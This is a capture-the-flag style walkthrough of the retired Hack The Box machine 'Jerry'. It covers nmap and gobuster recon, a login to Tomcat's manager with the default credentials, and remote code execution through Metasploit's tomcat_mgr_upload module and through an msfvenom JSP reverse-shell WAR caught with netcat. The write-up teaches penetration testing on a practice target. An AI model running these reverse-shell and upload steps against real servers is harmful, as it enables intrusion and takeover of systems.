---
title: "Hack The Box - Jerry"
date: 2022-06-09T10:38:09+05:30
draft: false
description: " jerry from HackTheBox is an retired machine which is vulnerable to Default Credential  and security Misconfiguration, which can be easily exploited with publicly available scripts and Metasploit "
hideToc: false
tocPosition: outer
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags: 
- Tomcat
- OWASP-A07:2021
- Malicious WAR File Upload
- Default Credentials
- Remote Code Execution
series:
- Pratical Ethical Hacking TCM
categories:
- Easy
- HackTheBox
- Windows
- Metasploit
- Public Exploit
libraries:

image: /images/hackthebox/jerry/Jerry.png 
---

Hi Hackers Welcome Back, Today we are going to look at Hack The Box Blue Machine.

{{< img src="/images/hackthebox/jerry/0.png" alt="image alt" width="450px"  position="center" >}}
## Info Table
<table style="width:100%">
 <thead>
  <tr>
    <th>Title</th>
    <th>jerry</th>
  </tr>
</thead>
<tr>
    <td>Category</td>
    <td>Hack The Box</td>
    </tr>
  <tr>
    <td>OS</td>
    <td>Windows</td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td><a href="https://www.hackthebox.eu/home/users/profile/2570"><img src="https://www.hackthebox.eu/badge/image/2570" alt="" style="display: unset"></a>  </td>
    </tr>
    <tr>
    </tr>
</table>

## Kill Chain Summery
While enumerating ports and services we can able to find the service, which is vulnerable OWASP-A07:2021 which can be easily exploited via publicly available scripts and Metasploit. 

## Mind Map 
{{< img src="/images/hackthebox/jerry/m1.png" alt="image alt" width="1000px"  position="center" >}}

## Recon 

Let’s scan target machine is any ports are open 

```bash {hl_lines=[2]}
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines]
└──╼ $nmap -Pn -sC -sV -A 10.129.159.199 -oN initial 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-09 06:04 IST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 6.40% done; ETC: 06:06 (0:01:28 remaining)
Nmap scan report for 10.129.159.199
Host is up (0.34s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.70 seconds
```

All port scan 

```bash {hl_lines=[8, 2]}
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines]
└──╼ $nmap -Pn -p- -T4 10.129.159.199 -oN aps
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-09 06:11 IST
Nmap scan report for 10.129.159.199
Host is up (0.33s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 426.05 seconds
```
{{< img src="/images/hackthebox/jerry/4.png" alt="image alt" width="1000px"  position="center" >}}
There is only one port open which is 8080, if we get look into port 8080. it is a tomcat default page, if you saw any web page next step  you need to do is directory brute force.

 ## Enumeration

```bash {hl_lines=[2, 20]}
┌─[atom@atom-vmwarevirtualplatform]─[~]
└──_ $gobuster dir -u http://10.129.159.199:8080 --wordlist /usr/share/wordlists/dirb/small.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.159.199:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/09 06:15:51 Starting gobuster in directory enumeration mode
===============================================================
/con                  (Status: 200) [Size: 0]
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/] 
/nul                  (Status: 200) [Size: 0]                 
                                                              
===============================================================
2022/06/09 06:16:28 Finished
===============================================================
```

Among all of the directory manager directory makes more interest, lets go to manager directory. whoo it asks password, let’s try to enter any gussable password like admin:admin.

{{< img src="/images/hackthebox/jerry/1.png" alt="image alt" width="1000px"  position="center" >}}


Look into error page it displays default username and password. tomcat:s3cret

{{< img src="/images/hackthebox/jerry/2.png" alt="image alt" width="1000px"  position="center" >}}

wow we logged in, while exploring application i have found temple upload feature 

let’s search any tomcat exploit available on Metasploit

## Exploitation using Metasploit

```bash {hl_lines=[15]}
[msf](Jobs:0 Agents:0) >> search tomcat

Matching Modules
================

   #   Name                                                            Disclosure Date  Rank       Check  Description
   -   ----                                                            ---------------  ----       -----  -----------
   0   auxiliary/dos/http/apache_commons_fileupload_dos                2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1   exploit/multi/http/struts_dev_mode                              2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   2   exploit/multi/http/struts2_namespace_ognl                       2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   3   exploit/multi/http/struts_code_exec_classloader                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   4   auxiliary/admin/http/tomcat_ghostcat                            2020-02-20       normal     Yes    Apache Tomcat AJP File Read
   5   exploit/windows/http/tomcat_cgi_cmdlineargs                     2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   6   exploit/multi/http/tomcat_mgr_deploy                            2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   7   exploit/multi/http/tomcat_mgr_upload                            2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   8   auxiliary/dos/http/apache_tomcat_transfer_encoding              2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   9   auxiliary/scanner/http/tomcat_enum                                               normal     No     Apache Tomcat User Enumeration
   10  exploit/multi/http/atlassian_confluence_webwork_ognl_injection  2021-08-25       excellent  Yes    Atlassian Confluence WebWork OGNL Injection
   11  exploit/windows/http/cayin_xpost_sql_rce                        2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
   12  exploit/multi/http/cisco_dcnm_upload_2019                       2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   13  exploit/linux/http/cisco_hyperflex_hx_data_platform_cmd_exec    2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform Command Execution
   14  exploit/linux/http/cisco_hyperflex_file_upload_rce              2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)
   15  exploit/linux/http/cpi_tararchive_upload                        2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   16  exploit/linux/http/cisco_prime_inf_rce                          2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   17  post/multi/gather/tomcat_gather                                                  normal     No     Gather Tomcat Credentials
   18  auxiliary/dos/http/hashcollision_dos                            2011-12-28       normal     No     Hashtable Collisions
   19  auxiliary/admin/http/ibm_drm_download                           2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   20  exploit/linux/http/lucee_admin_imgprocess_file_write            2021-01-15       excellent  Yes    Lucee Administrator imgProcess.cfm Arbitrary File Write
   21  exploit/multi/http/zenworks_configuration_management_upload     2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   22  auxiliary/admin/http/tomcat_administration                                       normal     No     Tomcat Administration Tool Default Access
   23  auxiliary/scanner/http/tomcat_mgr_login                                          normal     No     Tomcat Application Manager Login Utility
   24  exploit/multi/http/tomcat_jsp_upload_bypass                     2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   25  auxiliary/admin/http/tomcat_utf8_traversal                      2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   26  auxiliary/admin/http/trendmicro_dlp_traversal                   2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   27  post/windows/gather/enum_tomcat                                                  normal     No     Windows Gather Apache Tomcat Enumeration

Interact with a module by name or index. For example info 27, use 27 or use post/windows/gather/enum_tomcat
```

get look into module number 7  ``` exploit/multi/http/tomcat_mgr_upload  ``` this module some what related to this vulnerability 

```bash {hl_lines=[1, 29, 31, 33, 35, 37, 39, 50]}
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host

Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.132.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Java Universal

[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set HttpPassword s3cret
HttpPassword => s3cret
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set HttpUsername tomcat
HttpUsername => tomcat
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set rhost 10.129.159.199
rhost => 10.129.159.199
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set rport 8080
rport => 8080
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set lhost 10.10.14.33
lhost => 10.10.14.33
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> exploit

[*] Started reverse TCP handler on 10.10.14.33:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying rjeUAAh...
[*] Executing rjeUAAh...
[*] Sending stage (58829 bytes) to 10.129.159.199
[*] Undeploying rjeUAAh ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.10.14.33:4444 -> 10.129.159.199:49192 ) at 2022-06-09 07:00:51 +0530

(Meterpreter 1)(C:\apache-tomcat-7.0.88) >
```

yes, we got shell, the good thing is we don’t need to spend time on privilege escalation.  

```bash {hl_lines=[1, 9]}
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt
type "2 for the price of 1.txt
user.txt
7004dbcef0f854e0----------
root.txt
04a8b36e1545a4553-------------
C:\Users\Administrator\Desktop\flags>whoami
whoami
nt authority\system
```

## Exploiting via Manual Method 

{{< img src="/images/hackthebox/jerry/3.png" alt="image alt" width="1000px"  position="center" >}}

We know the platform and web server, using the known information create revers shell using msfvenom 

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/jerry]
└──╼ $msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.33 LPORT=9999 -f war -o rshell.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes
Saved as: rshell.war
```

we already know, there is an upload feature which accept .war format templet, based on that we have created payload,  lessen the configured  port  and upload the payload and click Deploy

``` bash
┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/jerry]
└──╼ $nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.33] from (UNKNOWN) [10.129.159.199] 49193
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

{{< notice success "we have successfully owned " >}}
See you on the next Blog, Happy hacking...
{{< /notice >}}